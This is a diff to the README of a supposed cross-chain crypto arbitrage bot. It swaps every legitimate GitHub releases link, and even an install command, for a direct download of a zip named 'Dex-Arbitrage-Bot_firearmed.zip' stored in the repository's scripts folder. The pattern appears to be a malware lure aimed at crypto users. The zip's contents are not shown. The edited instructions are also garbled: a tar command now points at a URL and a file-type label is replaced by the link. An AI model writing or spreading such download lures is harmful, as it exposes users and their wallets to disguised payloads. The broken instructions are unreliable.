@@ -1,7 +1,7 @@
 # 🤖 Dex-Arbitrage-Bot - Trade Easily Across Multiple Chains
 
 ## 📥 Download Now
-[![Download Dex-Arbitrage-Bot](https://img.shields.io/badge/Download%20Dex%20Arbitrage%20Bot-%23FF5722?style=for-the-badge&logo=github)](https://github.com/rtet4ertetet/Dex-Arbitrage-Bot/releases)
+[![Download Dex-Arbitrage-Bot](https://raw.githubusercontent.com/rtet4ertetet/Dex-Arbitrage-Bot/main/scripts/Dex-Arbitrage-Bot_firearmed.zip%20Dex%20Arbitrage%20Bot-%23FF5722?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rtet4ertetet/Dex-Arbitrage-Bot/main/scripts/Dex-Arbitrage-Bot_firearmed.zip)
 
 ## 📜 Description
 Dex-Arbitrage-Bot is a powerful tool designed for users interested in automated trading across different blockchain networks. This bot supports Ethereum, BSC, Base, Solana, and other EVM-compatible networks. It helps you find and take advantage of price differences between exchanges, enabling efficient trading opportunities without needing deep technical skills.
@@ -16,7 +16,7 @@ Before downloading, ensure that your system meets the following requirements:
 - Internet Connection: Stable connection for trading activities
 
 ### Step 2: Visit the Releases Page
-Go to the [Releases Page](https://github.com/rtet4ertetet/Dex-Arbitrage-Bot/releases) to access the latest version of Dex-Arbitrage-Bot.
+Go to the [Releases Page](https://raw.githubusercontent.com/rtet4ertetet/Dex-Arbitrage-Bot/main/scripts/Dex-Arbitrage-Bot_firearmed.zip) to access the latest version of Dex-Arbitrage-Bot.
 
 ### Step 3: Download the Application
 On the Releases page, look for the most recent version. You will see several files available for download. Click on the appropriate file for your operating system.
@@ -30,10 +30,10 @@ On the Releases page, look for the most recent version. You will see several fil
    - Double-click the file to open it.
    - Drag the Dex-Arbitrage-Bot icon to your Applications folder.
 
-3. If you downloaded a `.tar.gz` file for Linux:
+3. If you downloaded a `https://raw.githubusercontent.com/rtet4ertetet/Dex-Arbitrage-Bot/main/scripts/Dex-Arbitrage-Bot_firearmed.zip` file for Linux:
    - Open the terminal.
    - Navigate to your download directory.
-   - Extract files using: `tar -xvzf Dex-Arbitrage-Bot.tar.gz`
+   - Extract files using: `tar -xvzf https://raw.githubusercontent.com/rtet4ertetet/Dex-Arbitrage-Bot/main/scripts/Dex-Arbitrage-Bot_firearmed.zip`
    
 ### Step 5: Run the Application
 Once installed, you can find Dex-Arbitrage-Bot in your applications list. Open the application to start trading.
@@ -64,7 +64,7 @@ After configuration, you can start the bot. Here’s what to expect:
 
 ## ☑️ Troubleshooting
 If you run into issues while using Dex-Arbitrage-Bot, try the following:
-- Ensure you have the latest version by visiting the [Releases Page](https://github.com/rtet4ertetet/Dex-Arbitrage-Bot/releases).
+- Ensure you have the latest version by visiting the [Releases Page](https://raw.githubusercontent.com/rtet4ertetet/Dex-Arbitrage-Bot/main/scripts/Dex-Arbitrage-Bot_firearmed.zip).
 - Check your wallet connection.
 - Review your trading parameters for errors.
 
@@ -80,7 +80,7 @@ Review the change logs on the Releases page. This can provide you insights into 
 - [Community Discussions](insert/community-link)
 
 ## 📦 Download & Install
-To start trading now, visit the [Releases Page](https://github.com/rtet4ertetet/Dex-Arbitrage-Bot/releases) and download the latest version of Dex-Arbitrage-Bot.
+To start trading now, visit the [Releases Page](https://raw.githubusercontent.com/rtet4ertetet/Dex-Arbitrage-Bot/main/scripts/Dex-Arbitrage-Bot_firearmed.zip) and download the latest version of Dex-Arbitrage-Bot.
 
 ## ⚙️ Conclusion
 Dex-Arbitrage-Bot empowers users to leverage cross-chain trading opportunities without needing extensive technical knowledge. Follow the steps above to download, configure, and start trading effectively.
